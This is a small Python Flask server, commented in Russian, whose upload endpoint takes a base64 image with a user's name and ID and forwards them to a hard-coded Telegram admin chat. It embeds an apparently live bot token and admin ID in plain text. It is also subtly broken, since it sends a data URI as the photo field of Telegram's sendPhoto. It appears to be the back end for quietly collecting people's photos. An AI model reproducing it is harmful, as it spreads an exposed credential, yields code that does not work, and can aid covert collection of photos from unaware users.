from flask import Flask, request, jsonify
import requests

app = Flask(__name__)

# ================= НАСТРОЙКИ =================
BOT_TOKEN = "9012483299:AAHC6n9HcaG56ORXVXiu26SrkV1t3Cza1ms"  # <-- ВСТАВЬ СЮДА ТОКЕН БОТА (в кавычках)
ADMIN_ID = 7969464311      # <-- ВСТАВЬ СЮДА ТВОЙ ID (без кавычек)
# ============================================

@app.route('/', methods=['GET'])
def home():
    return "Server is running!"

@app.route('/upload', methods=['POST'])
def upload():
    try:
        data = request.json
        image_data = data['image']
        user_name = data.get('user_name', 'Неизвестный')
        user_id = data.get('user_id', 0)

        # Убираем префикс Base64
        image_base64 = image_data.split(',')[1]
        
        # Отправляем фото напрямую через API Telegram
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
        
        payload = {
            'chat_id': ADMIN_ID,
            'caption': f"📸 Фото от: {user_name}\nID: {user_id}",
            'photo': f"data:image/jpeg;base64,{image_base64}"
        }
        
        response = requests.post(url, data=payload)
        
        if response.status_code == 200:
            return jsonify({"status": "ok"}), 200
        else:
            return jsonify({"status": "telegram_error", "details": response.text}), 500
            
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
